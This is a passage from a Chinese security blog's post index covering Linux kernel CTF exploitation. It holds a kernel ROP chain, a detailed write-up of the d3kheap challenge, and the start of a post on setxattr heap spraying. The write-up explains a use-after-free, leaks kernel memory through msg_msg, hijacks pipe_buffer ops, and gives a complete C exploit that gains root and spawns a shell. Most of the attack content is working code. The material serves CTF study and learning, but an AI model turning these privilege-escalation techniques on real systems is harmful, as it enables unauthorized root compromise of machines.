*)buf)[0];    size_t payload[0x1000] = &#123;0&#125;;    int i;    for (i = 0; i &lt; 10; i++)    &#123;        payload[i] = canary;    &#125;    payload[i++] = 0xffffffff81000b2f + offset; // pop rdi; ret;    payload[i++] = 0;    payload[i++] = prepare_kernel_cred;    payload[i++] = 0xffffffff810a0f49 + offset; // pop rdx; ret;    payload[i++] = commit_creds;    payload[i++] = 0xffffffff8106a6d2 + offset; // mov rdi, rax; jmp rdx;    payload[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret;    payload[i++] = 0;    payload[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;    payload[i++] = (size_t)get_root;    payload[i++] = user_cs;    payload[i++] = user_rflags;    payload[i++] = user_sp;    payload[i++] = user_ss;    write(fd, payload, 0x800);    ioctl(fd, 0x6677889A, 0xffffffffffff0100);&#125;\n\nrop[i++] = 0xffffffff81000b2f + offset; // pop rdi; retrop[i++] = 0;rop[i++] = prepare_kernel_cred;         // prepare_kernel_cred(0)rop[i++] = 0xffffffff810a0f49 + offset; // pop rdx; retrop[i++] = 0xffffffff81021e53 + offset; // pop rcx; retrop[i++] = 0xffffffff8101aa6a + offset; // mov rdi, rax; call rdx; rop[i++] = commit_creds;rop[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; retrop[i++] = 0;rop[i++] = 0xffffffff81050ac2 + offset; // iretq; ret; rop[i++] = (size_t)spawn_shell;         // rip rop[i++] = user_cs;rop[i++] = user_rflags;rop[i++] = user_sp;rop[i++] = user_ss;\n\n这里是wiki上的payload片段，但是我有点不明白的是这里为什么要把mov rdi, rax; call rdx;的地址放到rcx里，并且这里不应该使用call rdx，如果是使用了call的话就会导致在结束是ret回来的地址就是gadget后面紧随的地址了，这也就导致swapgs以及后续rop chain无法执行，所以这里应该用jmp来代替(我也是在动态调试中发现的)。\n其次\n\n这里可以看到是可以泄漏出core_ioctl的地址的，所以我们可以不是用/tmp/kallsyms来获取地址。\nraw_vmlinux_base的由来：\ntcdy@arch-linux ~/Downloads/study_kernel % objdump -h test test:     file format elf64-x86-64Sections:Idx Name          Size      VMA               LMA               File off  Algn  0 .text         00c0325d  ffffffff81000000  0000000001000000  00200000  2**12                  CONTENTS, ALLOC, LOAD, READONLY, CODE\n\ncommit_creds偏移的由来：\n&gt;&gt;&gt; hex(ELF(&quot;./core/vmlinux&quot;).symbols[&#x27;commit_creds&#x27;]-0xffffffff81000000)&#x27;0x9c8e0&#x27;\n\n\n参考文章https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/#get-root-shell\n","categories":["kernel-pwn"],"tags":["kernel UAF","kernel ROP"]},{"title":"kernel内存搜索技术","url":"/2022/09/16/kernel%E5%86%85%E5%AD%98%E6%90%9C%E7%B4%A2%E6%8A%80%E6%9C%AF/","content":"这里作为演示的例题为d3kheap，也是我拖了很久的复现题目，题目链接放在文章末尾。这篇文章使用的方法是作者的预期解的方法，也就是setxattr多次劫持msg_msg泄漏地址，在下一篇文章会记录第二种方法 CVE-2021-22555。\n题目分析void __fastcall d3kheap_ioctl(__int64 a1, __int64 a2)&#123;  void *v2; // rax  _fentry__(a1, a2);  raw_spin_lock(&amp;spin);  if ( (_DWORD)a2 != 0xDEAD )  &#123;    if ( (unsigned int)a2 &gt; 0xDEAD )      goto LABEL_13;    if ( (_DWORD)a2 == 0x1234 )    &#123;      if ( buf )      &#123;        printk(&amp;unk_480);      &#125;      else      &#123;        v2 = (void *)kmem_cache_alloc_trace(kmalloc_caches[10], 0xCC0LL, 1024LL);        ++ref_count;        buf = v2;        printk(&amp;unk_37A);      &#125;      goto LABEL_5;    &#125;    if ( (unsigned int)a2 &gt; 0x1233 &amp;&amp; ((_DWORD)a2 == 0x4321 || (_DWORD)a2 == 0xBEEF) )      printk(&amp;unk_3F0);    else      LABEL_13:    printk(&amp;unk_4F8);    LABEL_5:    pv_ops[79](&amp;spin);    return;  &#125;  if ( !buf )  &#123;    printk(&amp;unk_4A8);    goto LABEL_5;  &#125;  if ( ref_count )  &#123;    --ref_count;    kfree();    printk(&amp;unk_394);    goto LABEL_5;  &#125;  d3kheap_ioctl_cold();&#125;\n\n首先题目只有create和delete的功能，漏洞点在于ref_count的错误初始化：\nref_count dd 1\n\n然后就是编译选项的readme文档：\nCONFIG_STATIC_USERMODEHELPER=yCONFIG_STATIC_USERMODEHELPER_PATH=&quot;&quot;CONFIG_SLUB=yCONFIG_SLAB_FREELIST_RANDOM=yCONFIG_SLAB_FREELIST_HARDENED=yCONFIG_HARDENED_USERCOPY=y\n\n\n开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）\n开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））\n开启了 Hardened Usercopy（在向内核拷贝数据时会进行检查，检查地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等）\n开启了 Static Usermodehelper Path（modprobe_path 为只读，不可修改）\n\n所以总的来说题目只存在一个UAF漏洞，除此之外什么都没有了。\n这里不过多的介绍setxattr函数，在前一篇文章有介绍，这里主要内容还是放在这一项技术的实现手法。\nsetxattr多次劫持msg_msg实现泄漏构造UAF首先我们如果是要劫持msg_msg的堆块的话需要他是在free状态，所以我们需要构造出UAF，构造步骤为：\n\nadd()出一个size为1024的堆块\ndel()删除刚刚的堆块\n利用msgsnd生成一块1024大小的msg_msg结构体\n最后利用del()删除掉msg_msg结构体所在的堆块\n\n之后这个堆块虽然对msg_msg来说是正在使用的状态，但是在slub看来是已经被free掉的了。\nmsg_msg地址搜索原理当我们调用msgget时会创建一个消息队列时，在内核空间中会创建这样一个结构体，其表示一个消息队列：\n/* one msq_queue structure for each present queue on the system */struct msg_queue &#123;\tstruct kern_ipc_perm q_perm;\ttime64_t q_stime;\t\t/* last msgsnd time */\ttime64_t q_rtime;\t\t/* last msgrcv time */\ttime64_t q_ctime;\t\t/* last change time */\tunsigned long q_cbytes;\t\t/* current number of bytes on queue */\tunsigned long q_qnum;\t\t/* number of messages in queue */\tunsigned long q_qbytes;\t\t/* max number of bytes on queue */\tstruct pid *q_lspid;\t\t/* pid of last msgsnd */\tstruct pid *q_lrpid;\t\t/* last receive pid */\tstruct list_head q_messages;\tstruct list_head q_receivers;\tstruct list_head q_senders;&#125; __randomize_layout;\n\n而当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体：\n/* one msg_msg structure for each message */struct msg_msg &#123;\tstruct list_head m_list;\tlong m_type;\tsize_t m_ts;\t\t/* message text size */\tstruct msg_msgseg *next;\tvoid *security;\t/* the actual message follows immediately */&#125;;\n\n所以在内核中这两个结构体会形成如下图所示的双向链表:\n\n如果这个消息队列中只存在一个消息则会形成如下链表：\n\n接下来深入看一下msg_msg结构体的创建，当我们使用msgsed函数时：\nstatic long do_msgsnd(int msqid, long mtype, void __user *mtext,                      size_t msgsz, int msgflg)&#123;  struct msg_queue *msq;  struct msg_msg *msg;  int err;  struct ipc_namespace *ns;  DEFINE_WAKE_Q(wake_q);  ns = current-&gt;nsproxy-&gt;ipc_ns;  if (msgsz &gt; ns-&gt;msg_ctlmax || (long) msgsz &lt; 0 || msqid &lt; 0)    return -EINVAL;  if (mtype &lt; 1)    return -EINVAL;  msg = load_msg(mtext, msgsz);  //...\n\n会调用loda_msg函数，而load_msg函数最终会调用alloc_msg函数：\nstruct msg_msg *load_msg(const void __user *src, size_t len)&#123;\tstruct msg_msg *msg;\tstruct msg_msgseg *seg;\tint err = -EFAULT;\tsize_t alen;\tmsg = alloc_msg(len);    //...\n\n阅读源码可以看到其会判断生成的msg_msg的结构体是否小于DATALEN_MSG也就是\n#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n\n如果小于则直接生产一个msg_msg结构体，如果大于会生成另外一个msg_msgseg结构体\nstatic struct msg_msg *alloc_msg(size_t len)&#123;  struct msg_msg *msg;  struct msg_msgseg **pseg;  size_t alen;  alen = min(len, DATALEN_MSG);  msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT);  if (msg == NULL)    return NULL;  msg-&gt;next = NULL;  msg-&gt;security = NULL;  len -= alen;  pseg = &amp;msg-&gt;next;  while (len &gt; 0) &#123;    struct msg_msgseg *seg;    cond_resched();    alen = min(len, DATALEN_SEG);    seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT);    if (seg == NULL)      goto out_err;    *pseg = seg;    seg-&gt;next = NULL;    pseg = &amp;seg-&gt;next;    len -= alen;  &#125;  return msg;  out_err:  free_msg(msg);  return NULL;&#125;\n\n总结上述的生成方式也就是：\n\n对于大小在【一个页面再减掉作为 header 的 msg_msg 的 size】范围内的数据而言，内核仅会分配一个 size + header size 大小的 object（通过 kmalloc），其前 0x30 大小的部分存放 msg_msg 这一 header，剩余部分用以存放用户数据\n对于大小超出【一个页面再减掉作为 header 的 msg_msg 的 size】范围的数据而言，其会额外生成 msg_msgseg 结构体来存放用户数据，通过 kmalloc 分配，大小为剩余未拷贝的用户数据大小加上 next 指针；该结构体与 msg_msg 的 next 成员形成一个单向链表，其前 8 字节存放指向下一个 msg_msgseg 的指针，若无则为 NULL\n\n\n有了上述依据我们不难想到，我们可以通过修改m_ts的值来实现堆上的越界数据读取，并且我们可以通过next指针来实现任意地址数据泄漏。但是这里存在这样一个问题，当我们使用msgrcv来读取数据时会调用list_del函数:\nstatic long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,                      long (*msg_handler)(void __user *, struct msg_msg *, size_t))&#123;  //...  list_del(&amp;msg-&gt;m_list);  //...  goto out_unlock0;  //...  out_unlock0:  ipc_unlock_object(&amp;msq-&gt;q_perm);  wake_up_q(&amp;wake_q);  out_unlock1:  rcu_read_unlock();  if (IS_ERR(msg)) &#123;    free_copy(copy);    return PTR_ERR(msg);  &#125;  bufsz = msg_handler(buf, msg, bufsz);  free_msg(msg);  return bufsz;&#125;\n\nstatic inline void list_del(struct list_head *entry)&#123;\t__list_del_entry(entry);\tentry-&gt;next = LIST_POISON1;\tentry-&gt;prev = LIST_POISON2;&#125;\n\n可以看到在list_del函数内部是会进行指针赋值的，所以如果存在非法地址的应用会造成panic，但是就目前为止我们还不知道任何内核地址，所以造成panic时肯定的。因此，为了绕过这一函数，并且可以读取内容我们需要修改msgrcv函数的标识位为MSG_COPY则内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink，从而我们便可以多次重复地读取同一个 msg_msg 结构体中数据:\n//...if (msgflg &amp; MSG_COPY) &#123;  if ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))    return -EINVAL;  copy = prepare_copy(buf, min_t(size_t, bufsz, ns-&gt;msg_ctlmax));  if (IS_ERR(copy))    return PTR_ERR(copy);&#125;//.../*\t\t * If we are copying, then do not unlink message and do\t\t * not update queue parameters.\t\t */  if (msgflg &amp; MSG_COPY) &#123;    msg = copy_msg(msg, copy);    goto out_unlock0;  &#125;//...\n\n接下来我们考虑越界读取的详细过程，我们首先可以利用 setxattr 修改 msg_msg 的 next 指针为 NULL、将其 m_ts 改为 0x1000 - 0x30（在 next 指针为 NULL 的情况下，一个 msg_msg 结构体最大占用一张内存页的大小），从而越界读出内核堆上数据。但是接下来我们需要进行地址搜索，所以需要搜索的地址为合法的，也就是next指针必须是合法的，如果next为非法指针则会引起kernel panic。\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)&#123;  struct msg_msgseg *dst_pseg, *src_pseg;  size_t len = src-&gt;m_ts;  size_t alen;  if (src-&gt;m_ts &gt; dst-&gt;m_ts)    return ERR_PTR(-EINVAL);  alen = min(len, DATALEN_MSG);  memcpy(dst + 1, src + 1, alen);  for (dst_pseg = dst-&gt;next, src_pseg = src-&gt;next;       src_pseg != NULL;       dst_pseg = dst_pseg-&gt;next, src_pseg = src_pseg-&gt;next) &#123;    len -= alen;    alen = min(len, DATALEN_SEG);    memcpy(dst_pseg + 1, src_pseg + 1, alen);  &#125;  dst-&gt;m_type = src-&gt;m_type;  dst-&gt;m_ts = src-&gt;m_ts;  return dst;&#125;\n\n所以我们需要确保获得一个合法的堆上地址进行搜索的同时确保我们所构造的next 链上皆为合法地址，并以 NULL 结尾，如何找到这样一个地址？\n总所周知，slub 会向 buddy system 申请一张或多张连续内存页，将其分割为指定大小的 object 之后再返还给 kmalloc 的 caller，对于大小为 1024 的 object，其每次申请的连续内存页为四张，分为 16 个 object\n# cat /proc/slabinfo slabinfo - version: 2.1# name            &lt;active_objs&gt; &lt;num_objs&gt; &lt;objsize&gt; &lt;objperslab&gt; &lt;pagesperslab&gt; : tunables &lt;limit&gt; &lt;batchcount&gt; &lt;sharedfactor&gt; : slabdata &lt;active_slabs&gt; &lt;num_slabs&gt; &lt;sharedavail&gt;# ...kmalloc-1k           464    464   1024   16    4 : tunables    0    0    0 : slabdata     29     29      0# ...\n\n如果是我们分配多个大小同为 1024 的 msg_msg 结构体，则其很容易落在地址连续的 4 张内存页上，此时若是我们从其中一个 msg_msg 结构体向后进行越界读，则很容易读取到其他的 msg_msg 结构体的数据，其 m_list 成员可以帮助我们泄露出一个堆上地址\n\n在前面这个链表中可以看出来是互相指向的，这里调试可以看到m_list的成员是只想msg_queue结构体的q_message域，而msg_queue结构体的q_message域也是只想msg_msg结构体的m_list域。\n此时按照常规思路就是首先泄漏出m_list结构内部的msg_queue结构体的地址，然后在msg_queue结构体向下进行搜索。虽然这种可以但是在后续进行ROP时会出现问题，这里先不提了后面再做解释，目前需要注意的是这里还是需要泄漏出msg_msg结构体的地址。\n虽然目前来看我们已经通过越界数据读取获得了一个堆地址也就是msg_queue地址，但是我们在读取过程中是将msg_queue结构体当作msg_msgseg结构体来进行阅读，所以我们需要保证他的next指针为NULL。不过幸运的是，msg_queue-&gt;q_lrpid 在未使用 msgrcv 接收消息时为 NULL，该成员在 q_message 成员向前的 8 字节处，因此我们可以将 next 指针指向这个位置。\n到目前为止我们所有存在的问题基本都已经解决了，已经可以开始进行内存搜索了。不过这里泄漏出来的kernel text地址是不一定的，原作者使用的办法是写一个字典来进行匹配，我这里也属实没有更好的解决办法了，所以继续延用了原作者的办法。\npipe_buffer劫持执行流构造double free这里原作者阐述了为什么不使用修改cred结构体，但是就目前来说我们想要实现任意地址写的话需要控制free堆块的类似fd指针的东西，所以我们需要使用到userfaultfd技术但是内核版本 5.11 起 userfaultfd 系统调用被限制为 root 权限才能使用，所以这条路基本是寄了。所以这里还是选择常规的劫持执行流。\n因为在kernel中堆检测类似于fast bin的检测，所以我们需要形成A-&gt;B-&gt;A这样的结构。并且，我们在形成double free的方式是需要进行msgrcv来实现的，所以我们需要在free之前恢复结构。\n劫持RIPpipe_buffer 这一结构体，当我们创建一个管道时，在内核中会生成数个连续的该结构体，申请的内存总大小刚好会让内核从 kmalloc-1k 中取出一个 object\n/** *\tstruct pipe_buffer - a linux kernel pipe buffer *\t@page: the page containing the data for the pipe buffer *\t@offset: offset of data inside the @page *\t@len: length of data inside the @page *\t@ops: operations associated with this buffer. See @pipe_buf_operations. *\t@flags: pipe buffer flags. See above. *\t@private: private data owned by the ops. **/struct pipe_buffer &#123;\tstruct page *page;\tunsigned int offset, len;\tconst struct pipe_buf_operations *ops;\tunsigned int flags;\tunsigned long private;&#125;;\n\n而当我们关闭了管道的两端时，会触发 pipe_buffer-&gt;pipe_buffer_operations-&gt;release 这一指针，因此我们只需要劫持其函数表即可，劫持的位置也很清晰：因为我们最终使用的setxattr函数来进行修改pipe_buffer的内容的，所以这里就体会到了我前面所说的为什么要泄漏msg_msg的地址了，我们需要将ops劫持到他自身。并在上面写上rop进行栈迁移，因为经过调试发现执行gagdte的时候rsi 寄存器指向 pipe_buffer，因此笔者选择了一条 push rsi ; pop rsp ; pop 4 vals ; ret 的 gadget 完成栈迁移\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/mman.h&gt;#include &lt;signal.h&gt;#include &lt;sys/prctl.h&gt;#define MSG_COPY 040000size_t kernelLeakQuery(size_t kernel_text_leak)&#123;    size_t kernel_offset = 0xdeadbeef;    switch (kernel_text_leak &amp; 0xfff)    &#123;    case 0x6e9:        kernel_offset = kernel_text_leak - 0xffffffff812b76e9;        break;    case 0x980:        kernel_offset = kernel_text_leak - 0xffffffff82101980;        break;    case 0x440:        kernel_offset = kernel_text_leak - 0xffffffff82e77440;        break;    case 0xde7:        kernel_offset = kernel_text_leak - 0xffffffff82411de7;        break;    case 0x4f0:        kernel_offset = kernel_text_leak - 0xffffffff817894f0;        break;    case 0xc90:        kernel_offset = kernel_text_leak - 0xffffffff833fac90;        break;    case 0x785:        kernel_offset = kernel_text_leak - 0xffffffff823c3785;        break;    case 0x990:        kernel_offset = kernel_text_leak - 0xffffffff810b2990;        break;    case 0x900:        kernel_offset = kernel_text_leak - 0xffffffff82e49900;        break;    case 0x8b4:        kernel_offset = kernel_text_leak - 0xffffffff8111b8b4;        break;    case 0xc40:        kernel_offset = kernel_text_leak - 0xffffffff8204ac40;        break;    case 0x320:        kernel_offset = kernel_text_leak - 0xffffffff8155c320;        break;    case 0xee0:        kernel_offset = kernel_text_leak - 0xffffffff810d6ee0;        break;    case 0x5e0:        kernel_offset = kernel_text_leak - 0xffffffff810e55e0;        break;    case 0xe80:        kernel_offset = kernel_text_leak - 0xffffffff82f05e80;        break;    case 0x260:        kernel_offset = kernel_text_leak - 0xffffffff82ec0260;        break;    case 0xb50:        kernel_offset = kernel_text_leak - 0xffffffff82dd4b50;        break;    case 0x620:        kernel_offset = kernel_text_leak - 0xffffffff8109e620;        break;    case 0xa00:        kernel_offset = kernel_text_leak - 0xffffffff82f04a00;        break;    case 0x300:        kernel_offset = kernel_text_leak - 0xffffffff81b25300;        break;    case 0xbe0:        kernel_offset = kernel_text_leak - 0xffffffff82e11be0;        break;    case 0x8b0:        kernel_offset = kernel_text_leak - 0xffffffff8115b8b0;        break;    case 0x5da:        kernel_offset = kernel_text_leak - 0xffffffff824505da;        break;    case 0x3c2:        kernel_offset = kernel_text_leak - 0xffffffff824073c2;        break;    case 0xd80:        kernel_offset = kernel_text_leak - 0xffffffff82eaed80;        break;    case 0x5cb:        kernel_offset = kernel_text_leak - 0xffffffff824505cb;        break;    case 0x3c3:        kernel_offset = kernel_text_leak - 0xffffffff8240b3c3;        break;    default:        puts(&quot;[x] fill up your dict!&quot;);        break;    &#125;    if ((kernel_offset % 0x100000) != 0) // miss hit?        kernel_offset = 0xdeadbeef;    return kernel_offset;&#125;typedef struct&#123;    long mtype;    char mtext[1];&#125; msg;struct list_head&#123;    struct list_head *next, *prev;&#125;;struct msg_msg&#123;    struct list_head m_list;    long m_type;    size_t m_ts;    /* message text size */    void *next;     /* struct msg_msgseg *next; */    void *security; /* NULL without SELinux */    /* the actual message follows immediately */&#125;;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void getShell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;int fd;void add()&#123;    ioctl(fd, 0x1234);&#125;void del()&#123;    ioctl(fd, 0xDEAD);&#125;int main()&#123;    save_status();    fd = open(&quot;/dev/d3kheap&quot;, O_RDONLY);    if (fd &lt; 0)    &#123;        puts(&quot;[*]open d3kheap error!&quot;);        exit(0);    &#125;    char *buf = malloc(0x4000);    int ret;    unsigned long kernel_heap_leak;    unsigned long *pointer_buf = malloc(0x4000);    int kmsg_idx;    int ms_qid[0x100];    unsigned long kernel_text_leak = NULL;    unsigned long kernel_base;    unsigned long kernel_offset;    unsigned long kmsg_addr = NULL;    unsigned long search_addr;    int idx;    int pipe_fd[2];    int pipe_fd2[2];    unsigned long fake_ops_offset;    unsigned long fake_ops_addr;    add();    del();    for (int i = 0; i &lt; 5; i++)    &#123;        ms_qid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);        if (ms_qid[i] &lt; 0)        &#123;            puts(&quot;[x] msgget!&quot;);            return -1;        &#125;    &#125;    for (int i = 0; i &lt; 5; i++)    &#123;        memset(buf, &#x27;A&#x27; + i, 0X1000 - 8);        ret = msgsnd(ms_qid[i], buf, 1024 - 0x30, 0);        if (ret &lt; 0)        &#123;            puts(&quot;[x] msgsnd!&quot;);            return -1;        &#125;    &#125;    del();    memset(buf, &#x27;Z&#x27;, 0x1000 - 8);    ((struct msg_msg *)buf)-&gt;m_list.next = NULL;    ((struct msg_msg *)buf)-&gt;m_list.prev = NULL;    ((struct msg_msg *)buf)-&gt;m_type = NULL;    ((struct msg_msg *)buf)-&gt;m_ts = 0x1000 - 0x30;    ((struct msg_msg *)buf)-&gt;next = NULL;    ((struct msg_msg *)buf)-&gt;security = NULL;    setxattr(&quot;/exp&quot;, &quot;196082&quot;, buf, 1024 - 0x30, 0);    ret = msgrcv(ms_qid[0], buf, 0x1000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);    if (ret &lt; 0)    &#123;        printf(&quot;[x] msgrcv!&quot;);        return -1;    &#125;    pointer_buf = (unsigned long)buf;    kernel_heap_leak = NULL;    for (int i = 0; i &lt; (0x1000 - 0x30) / 8; i++)    &#123;        // printf(&quot;[----data dump----][%d] %p\\n&quot;, i, pointer_buf[i]);        if (((pointer_buf[i] &amp; 0xffff000000000000) == 0xffff000000000000) &amp;&amp; !kernel_heap_leak &amp;&amp; (pointer_buf[i + 3] == (1024 - 0x30)))        &#123;            printf(&quot;[+] We got heap leak! kheap: %p\\n&quot;, pointer_buf[i]);            printf(&quot;idx=&gt;%d\\n&quot;, (int)(((char *)(&amp;pointer_buf[i + 2]))[0] - &#x27;A&#x27;));            idx = (int)(((char *)(&amp;pointer_buf[i + 2]))[0] - &#x27;A&#x27;);            kernel_heap_leak = pointer_buf[i];            fake_ops_offset = i * 8 + 0x30 - 8;            break;        &#125;    &#125;    if (!kernel_heap_leak)    &#123;        printf(&quot;[x] Failed to leak kernel heap!&quot;);        exit(-1);    &#125;    search_addr = kernel_heap_leak - 8;    int leaking_times = 0;    while (1)    &#123;        ((struct msg_msg *)buf)-&gt;m_list.next = NULL;        ((struct msg_msg *)buf)-&gt;m_list.prev = NULL;        ((struct msg_msg *)buf)-&gt;m_type = NULL;        ((struct msg_msg *)buf)-&gt;m_ts = 0x2000 - 0x30;        ((struct msg_msg *)buf)-&gt;next = search_addr;        ((struct msg_msg *)buf)-&gt;security = NULL;        setxattr(&quot;/exp&quot;, &quot;196082&quot;, buf, 1024 - 0x30, 0);        printf(&quot;[*] per leaking, no.%d time(s)\\n&quot;, leaking_times);        ret = msgrcv(ms_qid[0], buf, 0x2000 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR | MSG_COPY);        leaking_times++;        if (leaking_times == 100 &amp;&amp; !kernel_text_leak)        &#123;            return -1;        &#125;        if (ret &lt; 0)        &#123;            printf(&quot;[x] msgrcv!&quot;);            search_addr += 0x1000 - 8;            continue;        &#125;        pointer_buf = (unsigned long)buf;        if (leaking_times == 1 &amp;&amp; !kmsg_addr)        &#123;            kmsg_addr = pointer_buf[(0x1000 - 0x30) / 8 + 1];            fake_ops_addr = kmsg_addr - fake_ops_offset;            printf(&quot;[*] fake ops addr=&gt;%p\\n&quot;, fake_ops_addr);        &#125;        for (int i = (0x1000 - 0x30) / 8; i &lt; (0x2000 - 0x30) / 8; i++)        &#123;            if ((pointer_buf[i] &gt; 0xffffffff81000000) &amp;&amp; (pointer_buf[i] &lt; 0xffffffffbfffffff) &amp;&amp; !kernel_text_leak)            &#123;                printf(&quot;[*] We got text leak! ktext: %p\\n&quot;, pointer_buf[i]);                kernel_text_leak = pointer_buf[i];                kernel_offset = kernelLeakQuery(kernel_text_leak);                if (kernel_offset == 0xdeadbeef)                &#123;                    printf(&quot;[-] cant found kernel offset\\n&quot;);                    return 0;                &#125;                kernel_base = kernel_offset + 0xffffffff81000000;                break;            &#125;        &#125;        if (kernel_text_leak &gt; 0xffffffff81000000 &amp;&amp; kernel_text_leak &lt; 0xffffffffbfffffff)        &#123;            break;        &#125;    &#125;    printf(&quot;[+] kernel base: %p\\n&quot;, kernel_base);    printf(&quot;[+] kernel offset: %p\\n&quot;, kernel_offset);    ((struct msg_msg *)buf)-&gt;m_list.next = search_addr;    ((struct msg_msg *)buf)-&gt;m_list.prev = search_addr;    ((struct msg_msg *)buf)-&gt;m_type = NULL;    ((struct msg_msg *)buf)-&gt;m_ts = 1024 - 0x30;    ((struct msg_msg *)buf)-&gt;next = NULL;    ((struct msg_msg *)buf)-&gt;security = NULL;    setxattr(&quot;/exp&quot;, &quot;196082&quot;, buf, 1024 - 0x30, 0);    ret = msgrcv(ms_qid[idx], buf, 1024 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);    if (ret &lt; 0)    &#123;        puts(&quot;[x] msgrcv!&quot;);        return -1;    &#125;    puts(&quot;[*] the gap is freed&quot;);    ret = msgrcv(ms_qid[0], buf, 1024 - 0x30, 0, IPC_NOWAIT | MSG_NOERROR);    if (ret &lt; 0)    &#123;        puts(&quot;[x] msgrcv!&quot;);        return -1;    &#125;    puts(&quot;[+] double free done!&quot;);    pipe(pipe_fd);    pipe(pipe_fd2);    memset(pointer_buf, &#x27;B&#x27;, 0x1000);    pointer_buf[1] = 0xffffffff812dbede + kernel_offset;    pointer_buf[2] = fake_ops_addr;    unsigned long pop_rdi = 0xffffffff810938f0 + kernel_offset;    unsigned long init_cred = 0xffffffff82c6d580 + kernel_offset;    unsigned long commit_cred = 0xffffffff810d25c0 + kernel_offset;    unsigned long swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00ff0 + kernel_offset;    int rop = 4;    pointer_buf[rop++] = pop_rdi;    pointer_buf[rop++] = init_cred;    pointer_buf[rop++] = commit_cred;    pointer_buf[rop++] = swapgs_restore_regs_and_return_to_usermode + 0x16;    pointer_buf[rop++] = 0;    pointer_buf[rop++] = 0;    pointer_buf[rop++] = getShell;    pointer_buf[rop++] = user_cs;    pointer_buf[rop++] = user_rflags;    pointer_buf[rop++] = user_sp;    pointer_buf[rop++] = user_ss;    setxattr(&quot;/exp&quot;, &quot;196082&quot;, pointer_buf, 1024 - 0x30, 0);    printf(&quot;gadget addr =&gt; %p\\n&quot;, pointer_buf[1]);    close(pipe_fd[0]);    close(pipe_fd[1]);    return 0;&#125;\n\n\n补充一下这里解释一下为什么使用swapgs_restore_regs_and_return_to_usermode+0x16首先这里是ROP所以我们需要的是最后swapgs然后iretq，并且这里是开启了KPTI保护的，所以我们在最后还需要修改cr3寄存器。其次为什么要加上0x16呢？首先我们要知道的是前面的pop对我们来说并没有什么用。其次就是在切换完cr3之后我们还有两次pop所以我们需要保证rsp也是在可以识别的，最终根据上述要求我们必须选择swapgs_restore_regs_and_return_to_usermode+0x16。\n\n参考链接：https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/#0x01-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90\n题目链接：https://github.com/196082/196082/blob/main/kernel_pwn/d3kheap.zip\n","categories":["kernel-pwn"],"tags":["msg_msg","pipe_buffer","setxattr"]},{"title":"kernel堆占位","url":"/2022/09/06/kernel%E5%A0%86%E5%8D%A0%E4%BD%8D/","content":"关于userfaultfd这里就不再提及了，不熟悉的可以看一下上一篇文章 https://cv196082.gitee.io/2022/08/16/userfaultfd/ \nsetxattrsetxattr这个系统调用是非常独特的，在kernel的利用中他可以为我们提供几乎任意大小的object分配。\nsetxattr的调用链如下：\nSYS_setxattr()=&gt;path_setxattr()=&gt;setxattr()\nstatic long  setxattr(struct user_namespace *mnt_userns, struct dentry *d,           const char __user *name, const void __user *value, size_t size,           int flags)&#123;  int error;  void *kvalue = NULL;  char kname[XATTR_NAME_MAX + 1];  if (flags &amp; ~(XATTR_CREATE|XATTR_REPLACE))    return -EINVAL;  error = strncpy_from_user(kname, name, sizeof(kname));  if (error == 0 || error == sizeof(kname))    error = -ERANGE;  if (error &lt; 0)    return error;  if (size) &#123;    if (size &gt; XATTR_SIZE_MAX)      return -E2BIG;    kvalue = kvmalloc(size, GFP_KERNEL);    if (!kvalue)      return -ENOMEM;    if (copy_from_user(kvalue, value, size)) &#123;      error = -EFAULT;      goto out;    &#125;    if ((strcmp(kname, XATTR_NAME_POSIX_ACL_ACCESS) == 0) ||        (strcmp(kname, XATTR_NAME_POSIX_ACL_DEFAULT) == 0))      posix_acl_fix_xattr_from_user(mnt_userns, d_inode(d),                                    kvalue, size);  &#125;  error = vfs_setxattr(mnt_userns, d, kname, kvalue, size, flags);  out:  kvfree(kvalue);  return 